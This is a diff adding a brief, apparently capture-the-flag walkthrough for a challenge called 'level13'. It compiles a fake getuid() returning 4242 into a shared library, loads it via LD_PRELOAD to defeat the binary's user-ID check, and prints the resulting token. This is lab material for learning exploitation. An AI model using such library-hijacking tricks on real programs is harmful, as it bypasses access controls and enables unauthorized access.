@@ -1,0 +1,18 @@
+vim /tmp/myuid.c :
+
+int getuid()
+{
+	return (4242);
+}
+
+cd /tmp
+
+gcc -shared -o /tmp/myuid.so /tmp/myuid.c
+
+export LD_PRELOAD=/tmp/myuid.so
+
+strace ./level13
+
+...
+your token is 2A31L79asukciNyi8uppkEuSx
+
